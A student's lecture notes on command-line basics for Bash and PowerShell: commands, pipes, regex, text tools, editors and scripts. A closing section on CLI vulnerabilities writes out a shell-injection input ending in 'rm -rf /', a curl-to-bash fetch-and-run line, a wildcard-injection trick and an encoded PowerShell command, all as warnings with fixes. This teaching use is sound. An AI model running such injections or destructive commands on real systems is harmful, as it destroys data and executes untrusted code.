---
aliases: []
date created: Wednesday, 26. November 2025, 08:11
date modified: Thursday, 11. December 2025, 09:12
---

# 2025-11-26 Command-Line Interface (Gísli)
# Gísli’s notes

- We’ll need Virtual Machines later in the course, of course.
- Learning how to use the CLI (Command Line Interface) is extremely important, in this course and elsewhere.
    - Many tools exist *only* in the CLI. Often (but not always), tools are first made with a TUI (Text User Interface) and later with a GUI (Graphical User Interface).
- Unix introduced the Shell and piping in 1969.
    - “Piping” allows you to send the output of one command as the input to another.
- Linux dominates the current internet infrastructure. MacOS X is a friendly GUI on top of the Unix CLI.
- Pros of the CLI:
    - Speed and efficiency.
    - Wildcards and regex.
    - Piping. Lets you chain different tools together.
    - Automation and scripting. Essentially, use all the pros of programming for *everything.*
    - Lets you access the “hidden” 20% of features that the GUI hides. The GUI often protects the user from making mistakes or becoming confused.
    - Overriding safety rails.
    - More detailed debugging control.
    - Again, many tools have a TUI interface first, and someone later makes a GUI for it.
    - The standard for performing remote server management is often achievable only via the CLI.
    - Low resource usage, significantly faster than a GUI.
    - The user interface is often pretty consistent across different operating systems, even over the past 50 years.
    - Much easier to communicate exactly to someone what they should do.
- Different Shells (CLIs):
- **The Unix family**.
    - Bash: [POSIX](<../Terminology/Systems & Plaforms/POSIX.md>)-compliant, default on most Linux
    - Zsh: more customizable, advanced features, default on macOS
- **The Windows family**.
    - PowerShell: Standard for Windows administration, has things like `OO` (pipes.NET Objects instead of text)
    - WSL (Windows Subsystem for Linux): allows you to run Bash/Zsh.
    - CMD (deprecated).
- **Infrastructure & Language CLIs**
    - Cloud CLIs (AWS CLI, Azure CLI, gcloud)
    - Language REPLs (Read-Eval-Print Loops), e.g., `python -i`.

## Useful commands

> [!warning]
> PowerShell allows you to use many Bash command names (like `ls` or `cp`), but they are just aliases.


- **The Syntax**: PowerShell uses “Verb-Noun” pairs (e.g., `Get-ChildItem`, `Copy-Item`,  `Set-Location`).
- **The Alias**: `ls` is just an alias/nickname for `Get-ChildItem`.
- **The Trap**: Command names work, but their flags do not.
    - **Bash**: `ls -la` ✔
    - **PowerShell**: `ls -la` ✕→ You must use `ls -Force` instead.

### Navigation & file searching (TODO)

| Action | Bash/Zsh | PowerShell |
| --- | --- | --- |
| Print directory | `pwd` | `pwd` (`Get-Location`) |
| List Files | `ls` | `ls` / `dir` |
| List Hidden Files | `ls -a` | `ls -Force` |
| Change Dir | `cd` | `cd` (`Set-Location`) |
| Create File | `touch file` | `ni file` (`New-Item`) |
| Copy | `cp` | `cp` / `copy` (`Copy-Item`) |
| Move/Rename | `mv` | `mv` / `move` (`Move-Item`) |
| Delete | `rm` | `rm` / `del` (`Remove-Item`) |
| Force Delete | `rm -rf` | `rm -Recurse -Force` |
| Show the manual | `man <command>` | `help`, `man` (`Get-Help`) |
| History | `history` | `history` (`Get-History`) |

### Reading & Searching (TODO)

| Action               | Bash/Zsh          | PowerShell                                             |
| -------------------- | ----------------- | ------------------------------------------------------ |
| Read content         | `cat`             | `cat` / `type` (`Get-Content`)                         |
| Pager                | `less`            | `more`                                                 |
| First $n$ lines      | `head -n 10`      | `select -first 10` (`Select-Object -First 10`)         |
| Last $n$ lines       | `tail -n 10`      | `select -last 10` (`Select-Object -Last 10`)           |
| Live Log             | `tail -f`         | `Get-Content -Wait`                                    |
| Search Text          | `grep "txt"`      | `sls "txt"` (`Select-String`)                          |
| Find File            | `find. -name "X"` | `ls -r -filter "X"` (`Get-ChildItem -Recurse -Filter`) |
| Find File by Content | `grep -R "txt"`   | `ls -r                                                 |

- **SuperUser Permissions:**
	- **Bash**: `sudo command`
	- **PowerShell**: Right-Click → “Run as Administrator”.
- **Process Management:**
    - **Bash**: `ps`, `kill PID`
    - **PowerShell**: `ps` (`Get-Process`), `kill` (`Stop-Process`)
- **Web Requests:**
    - **Bash**: `curl url`
        - (Fetch the thing at this URL. Lets you download stuff at this URL.)
    - **PowerShell**: `curl` (`Invoke-WebRequest`)
    - (Note: PowerShell’s ‘`curl`’ is NOT the real `curl`. It parses *HTML* objects.)

Use <kbd>Ctrl</kbd>+<kbd>R</kbd> for reverse search in history.

Auto-complete (by pressing ↹Tab) for commands and file names is a common feature in almost all CLIs.

## Pipes - The glue of the Command Line Interface

**Term**: Piping
**Definition**: “A mechanism that connects the *output* of one program to the *input* of another.”

```bash
command1 | command2
```

- **The Symbol**: The vertical bar (`|`).
- **The Flow**: STDOUT of one command becomes STDIN of the next.
- **The Unix Philosophy**: “Write programs that do one thing and do it well. Write programs to work together.”
- **The Benefit**: No need to create temporary files. Data flows in memory.
A little example (these commands aren’t actually real):

```bash
get_user_input() | reverse_string_text()
```

↑this would get an input from the user, and then *reverse* that text.

An *actual* Bash example of piping:

```bash
cat file.txt | grep "error" | sort
```

This command sequence does the following:

1. `cat file.txt`: Reads the contents of `file.txt`.
2. `grep "error"`: Filters lines containing the word “error”.
3. `sort`: Sorts the filtered lines alphabetically.
This is a powerful way to process and analyze text data using simple, modular commands.

### Text vs. Object Streams

**Bash/Zsh (Text Streams)**

- Pipes carry sequences of characters.
- The receiving command needs to parse the strings.
- Example: `ls | grep ".txt$"` (matches the string in each line)

**PowerShell (Objects)**

- Commands output .NET Objects.
- The receiving command operates on objects and their properties.
- Example: `ls | Where Extension -eq ".txt"` (matches the “Extension” property of the file objects)

### A more complex piping example

```bash
# List all files | Sort by size column | Take last 3
ls -l | sort -nk5 | tail -n3
```

The Logic:

1. `ls` generates the raw list.
2. `|` passes that list to `sort`.
3. `sort` reorders the data.
4. `|` passes the sorted list to `tail`.
5. `tail` discards everything except the final 3 lines.

## Patterns: File Globs vs. Regular Expressions (Regex)

> [!warning] The Confusion
> Both systems use similar symbols (like `*`), but they mean different things and serve different purposes.

|  | **File Globs (Wildcards)** | **Regular Expressions (Regex)** |
| --- | --- | --- |
| **Interpreter** | The Shell (Bash/Zsh/PS) | The Tool (grep, sed, awk, editors) |
| **Target** | Filenames | Text Content (Inside files) |
| **Timing** | Expands before command runs. | Processed during command execution. |
| **The `*` Symbol** | “Everything” (e.g., `*.txt`) | “Zero or more of the previous character” |
| **The `?` Symbol** | “Any single character” | “Zero or one of the previous character” |
| **Common Use** | `ls *.jpg` | `grep "Error.*" log.txt` |

### Regular Expression Syntax

Basic Syntax Cheatsheet:

- `.` (Dot) → Any single character.
- `^` (Caret) → Start of a line.
- `$` (Dollar) → End of a line.
- (Star) → Zero or more of the previous item.
- `[a-z]` → Any character in the bracket range (any lowercase character in the alphabet from `a` to `z`)
    - `[a-zA-Z]` would be any lowercase or uppercase letter in the alphabet.
- `(X|Y)` → Either pattern `X` or pattern `Y`.

## Text Processing: `tr`, `cut`, `sed`, `awk`

| **Tool** | **Mental Model**                                                                             | **Syntax & Example**                                                                      |
| -------- | -------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| `tr`     | **The Char Swapper.  <br>**Swaps or deletes single characters. Cannot handle words.          | `tr '<old>' '<new>'`  <br>Ex: Uppercase:  <br>`echo "hi" \| tr 'a-z' 'A-Z'`               |
| `cut`    | **The Slicer.  <br>**Strictly slices each line based on a specific delimiter (like a comma). | `cut -d"<delim>" -f<number>   `Ex: Get 1st column of CSV:  <br>`cut -d"," -f1 data.csv`   |
| `sed`    | **The Surgeon.  <br>**Uses Regex to find and replace patterns within the text.               | `sed 's/<find>/<replace>/g'`  <br>Ex: Replace text:  <br>`sed 's/cat/dog/g' file.txt`     |
| `awk`    | **The Spreadsheet.  <br>**Smart column extraction. Handles messy whitespace automatically.   | `awk '{print $<N>}'   `Ex: Get PID (2nd col) from `ps`:  <br>`ps aux \| awk '{print $2}'` |

Use `cut` for simple delimiters (CSV). Use `awk` for messy output (like `ls` or `ps`) where spaces vary.

### PowerShell Equivalents: The Object Way

In PowerShell, you rarely manipulate raw text streams. You manipulate Properties and call Methods.

| **Unix Tool**              | **PowerShell Strategy**                                                | **PowerShell Syntax/Example**                                                      |
| -------------------------- | ---------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| `tr`<br>(Char swap)        | String Methods.  <br>Call .NET methods directly on the string object.  | `<String>.Method()`  <br>Ex: `"hello".ToUpper()`  <br>Ex: `" hi ".Trim()`          |
| `sed`<br>(Regex replace)   | The `-replace` Operator.  <br>Uses Regex natively to swap patterns.    | `$_ -replace 'regex','new'`  <br>Ex:  <br>`"cat" -replace 'c','b'`→ “bat”          |
| `cut` & `awk`<br>(Columns) | `Select-Object`.  <br>Don’t cut delimiters; ask for the property name. | `Select-Object Name, Id`  <br>Ex (CSV):  <br>`Import-Csv data.csv \| select Email` |

## Loops: Iterating over items

**Bash syntax**

- Structure: `for ... do ... done`
- Variable accessed via `$var`

```bash
for f in *. txt ; do
	mv " $f " " $f . bak "
done
```

**PowerShell Syntax**

- Structure: `foreach` or pipeline
- Current item is `$_` (in pipe)

```powershell
ls *. txt | ForEach - Object {
	Rename - Item $_ - NewName ( $_ . Name + ". bak ")
}
```

## Functions: Arguments and Parameters

**Bash (Positional)**

- Arguments are unnamed.
- Accessed by number (`$1`, `$2`).

```bash
greet() {
	echo "Hello $1"
}
```

Usage: `greet "John"`

**PowerShell (Named)**

- Arguments are named parameters.
- Defined in `param()` block.

```powershell
function Greet {
	param($Name)
	Write-Host "Hello $Name"
}
```

Usage: `Greet -Name "John"`

# Editors and Script Files

## CLI Text Editors: Nano, Vim, Emacs

**The Challenge**: Editing files directly on a server without a mouse.

| **Editor**                         | **Archetype** | **Description**                                                                                                                                                                                                                      |
| ---------------------------------- | ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Nano**                           | The Beginner  | Modeless. behaves like Notepad. Instructions are listed at the bottom (e.g., Ctrl+X to Exit).                                                                                                                                        |
| **Vim**                            | The Standard  | Modal. You are either in “Insert Mode” (typing) or “Command Mode” (navigating). Extremely fast once learned. Installed on 99% of servers.                                                                                            |
| **Emacs**<br>(*don’t use this 😟*) | The Ecosystem | Programmable. An interpreter for Lisp.<br>Extremely “powerful” (*does “powerful” just mean “does a bunch of crap”? Linux people keep throwing that word around...*) (can run email, calendars, games), but complex key combinations. |

> [!tip] Tip:
>
> If you don’t want to learn Vim, at least remember how to close it:
\<ESCAPE> `:q!` \<ENTER>

## Script Files: Storing and Executing

| **Shell**    | **Extension**             | **Header**                   | **Execution Requirements**                                                                                                  |
| ------------ | ------------------------- | ---------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| Bash         | myfile.sh                 | `#!/bin/bash`<br>(“Shebang”) | Permission: Must be executable (run `chmod +x file.sh`) <br>Run: Must use `./file.sh` (Security feature).                   |
| CMD (Legacy) | `myfile.bat` `myfile.cmd` | `@echo off`<br>(optional)    | **Run**: Type the filename (e.g., `myfile.bat`).                                                                            |
| PowerShell   | `myfile.ps1`              | None                         | **Policy**: Blocked by default. Enable with, e.g., `Set-ExecutionPolicy X`. <br>**Run**: Must use `.\file.ps1` (Like Bash). |

> [!note] Note: The Shebang (#!)
> In Unix/Bash, the first line `#!/bin/bash` tells the [OS](<../Terminology/Systems & Plaforms/Operating System.md>) which interpreter to use. You can change this to e.g. `#!/usr/bin/python` to write a Python script that behaves like a shell script.

# Vulnerabilities in the Command Line

## Injection and Unsafe Execution


> [!error] Shell Injection (Command Injection)
> Occurs when user input is passed unsanitized to a system command.
>
> - **Vulnerable Code**: `rm $filename`
> - **Malicious Input**: `file.txt; rm -rf /`
> - **Result**: The shell interprets the semicolon as “end of command” and
executes the delete command next.
> - **Fix**: `rm "$filename"`

> [!error] The “Curl — Bash” Anti-Pattern
> `curl http://untrusted.com/script.sh | bash`
>
> - **The Risk**: You are executing code from the internet **blindly**.
> - **The Fix**: Download the script *first*, inspect the code (read it), and
then (*maybe*) execute it.

## Operational Security

> [!error] History File Leaks
> - Shells save command history to disk (e.g., `.bash_history`).
> - **Danger**: Typing secrets in flags.
> `mysql -pSecret123`
> - **Result**: Password is stored in plain text on the hard drive.
> - **Fix**: Use interactive prompts or environment variables.

> [!error] Path Hijacking
> - The `$PATH` variable controls where the shell looks for programs.
> - **Danger**: Adding `.` (current directory) to the start of PATH (or in the
path at all).
> - **Scenario**: The attacker places a [virus](<../Terminology/Attacks/Malware/Virus.md>) named ‘ls’ in a shared folder. You type `ls`, and the [virus](<../Terminology/Attacks/Malware/Virus.md>) runs instead of the real command.

## Permission Laziness

> [!error] The “`chmod 777`” trap
> - **Action**: Granting Read/Write/Execute permissions to *Everyone* to fix a “permission denied” error.
> - **Risk**: Any user (or hacked web service) can overwrite your scripts.
> - **Scenario**: Attacker modifies a startup script. When you reboot, their [Malware](<../Terminology/Attacks/Malware/Malware.md>) runs with your admin privileges.

> [!error] Running as Root
> - **Principle of Least Privilege**: Always log in as a standard user; use `sudo` only when necessary.
> - **The Typo Hazard**: `rm -rf / home/foo/bar` (The space after the slash deletes the entire root directory).

## Tricks and Obfuscation

> [!error] Unix: Wildcard Injection
> **Concept**: Filenames can look like Flags.
> 1. Attacker creates a file named `-rf`.
> 2. Admin runs `rm *` inside that folder.
> 3. Shell expands `*` to: `file1 file2 -rf`.
> 4. Command becomes: `rm file1 file2 -rf`.
> 5. Result: `rm` forces a recursive delete instead of deleting the file named “-rf”.

> [!error] PowerShell Obfuscation
> Attackers hide malicious code in Base64-encoded strings to bypass text scanners.
> `PowerShell.exe -EncodedCommand ZWNobyAiaGFja2VkIg==`

# Up Next ..

## Further Studies / Experiments

1. How can you prevent wildcard injection attacks, such as the one with `rm *`
shown in the slides?
2. **The “Curl — Bash” Problem**:
    - Find a recent example of a supply-chain attack where a remote script was compromised.
    - If you must install software this way, what specific steps should you take to verify the script’s integrity before running it?
3. **Principle of Least Privilege**:
    - Why is `sudo` safer than logging in as root directly?
    - Research the concept of the “Audit Trail” in system logs. How does `sudo` help track who did what?
4. **Path Hijacking**: Create a safe experiment on your own machine (or a
VM):
    - Create a script named ‘ls’ in a local folder, modify your `$PATH`,
    and see if you can trick your shell into running it.
    - How do modern OSs (Windows/Linux) try to prevent this by default?
5. **The Un-deletable File**:
    - You have a file named ‘-i’.
    - Every time you try to delete it (`rm -i`), the system asks you for confirmation, but even if you say yes, it doesn’t delete. Why?
    - How do you fix it?

## Lab 3

“Find your way through a randomly generated file tree using command-line tools and scripts.”
